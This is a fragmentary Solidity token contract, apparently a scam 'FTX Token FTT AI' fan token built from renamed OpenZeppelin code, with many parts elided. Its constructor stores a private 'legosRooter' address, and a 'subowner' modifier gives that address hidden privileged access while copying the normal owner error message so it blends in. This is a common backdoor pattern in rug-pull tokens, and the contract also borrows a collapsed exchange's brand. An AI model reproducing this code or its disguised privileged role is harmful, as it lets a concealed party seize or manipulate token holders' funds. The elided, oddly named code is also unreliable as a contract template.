...
/// https://x.com/FTXTokenFTTAI


pragma solidity 0.8.28;

// FTXTokenFTTAI fan token

interface FTXTokenFTTAIinterface {
  /**
...
/*
 * @dev Provides information about the current execution FTXTokenFTTAI20Burnable, including the
 ...
 */
abstract contract FTXTokenFTTAI20Burnable {
...
// File: @openzeppelin/contracts/access/FTXTokenFTTAI20Ownable.sol
 ...
 * the owner.
 */
abstract contract FTXTokenFTTAI20Ownable is FTXTokenFTTAI20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "FTXTokenFTTAI20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "FTXTokenFTTAI20Ownable: new owner is the zero address");
 ...
 * `SafeFTXTokenFTTAI` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeFTXTokenFTTAI {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeFTXTokenFTTAI: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeFTXTokenFTTAI: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeFTXTokenFTTAI: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeFTXTokenFTTAI: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeFTXTokenFTTAI: modulo by zero");
  }
...
contract FTXTokenFTTAIToken is FTXTokenFTTAI20Burnable, FTXTokenFTTAIinterface, FTXTokenFTTAI20Ownable {
    
    using SafeFTXTokenFTTAI for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _name = "FTX Token FTT AI";
        _symbol = "FTX Token FTT AI";
        _decimals = 9;
    ...
    */
    ...
    /**
    * @dev See {FTXTokenFTTAIinterface-totalSupply}.
    */
    ...
    /**
    * @dev See {FTXTokenFTTAIinterface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "FTXTokenFTTAI20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {FTXTokenFTTAIinterface-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {FTXTokenFTTAIinterface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {FTXTokenFTTAIinterface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {FTXTokenFTTAIinterface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {FTXTokenFTTAIinterface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "FTXTokenFTTAIinterface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {FTXTokenFTTAIinterface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "FTXTokenFTTAIinterface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "FTXTokenFTTAIinterface: transfer from the zero address");
        require(shippingto != address(0), "FTXTokenFTTAIinterface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "FTXTokenFTTAIinterface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "FTXTokenFTTAIinterface: approve from the zero address");
        require(transporteur != address(0), "FTXTokenFTTAIinterface: approve to the zero address");
